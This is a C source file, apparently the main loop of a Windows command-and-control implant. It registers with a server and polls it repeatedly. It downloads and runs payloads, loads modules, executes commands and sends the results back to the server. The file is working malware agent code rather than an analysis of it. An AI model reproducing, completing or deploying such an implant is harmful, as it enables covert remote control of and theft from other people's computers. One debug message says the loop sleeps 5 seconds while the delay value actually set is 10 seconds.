#include "../../includes/core/core.h"
#include "../../includes/loader/loader.h"
#include "../../includes/comms/comms.h"

LdrInstance *ldr = NULL;
PVOID g_ImageBase = NULL;



void LdrMain() 
{
#ifdef DEBUG 
	AllocConsole();
#endif
	if(!LdrAllocateCoreStructsAndLoadApis()) {
		DBGA("[!] Failed Allocating structs and apis\n");
		LdrExitThread(0);
	}
	
	DBGA("[*] Allocation done, Parsing config\n");

	if(!ParseConfig()) {
		DBGA("[!] Failed Parsing config\n");
		LdrExitThread(0);
	}
	DBGA("[*] Parsed Config\n");

	if(!LdrRegisterAgent()) {
		LdrExitThread(0);
	}

	LdrInitPoll();
	DBGA("[*] Going into poll Loop\n");
	while(TRUE) {
		LARGE_INTEGER time;
		time.QuadPart = -10000LL * 10000LL;
		DBGA("[*] Sleeping for 5 seconds\n");
		ldr->win32->NtDelayExecution(FALSE, &time);
		LdrTask task = LdrPollServer();
		if(!task.ok) {
			LdrExitThread(0);
		}

		if(task.code == TASK_NO_TASK)
			continue;

		// One writer for the whole output frame. Handlers append their payload;
		// we post only if they actually wrote something past the header.
		ParserWrite *p = ParserInitWrite();
		if(!p)
			LdrExitThread(0);

		LdrBeginOutput(p, task.Id);
		SIZE_T headerSize = ParserWriteReturnSize(p);

		switch(task.code) {
		case TASK_LOAD:
			if(!LdrLoadAndRun(task, p)) {
				ParserClearWrite(p);
				LdrExitThread(0);
			}
			break;
		case TASK_MODULE:
			if(!LdrRunModule(task, p)) {
				ParserClearWrite(p);
				LdrExitThread(0);
			}
			break;
		case TASK_CMD:
			if(!LdrRunCmd(task, p)) {
				ParserClearWrite(p);
				LdrExitThread(0);
			}
			break;
		}

		if(ParserWriteReturnSize(p) > headerSize)
			NwPostOutput(ParserWriteReturnPointer(p), ParserWriteReturnSize(p));
		ParserClearWrite(p);
	}
		
}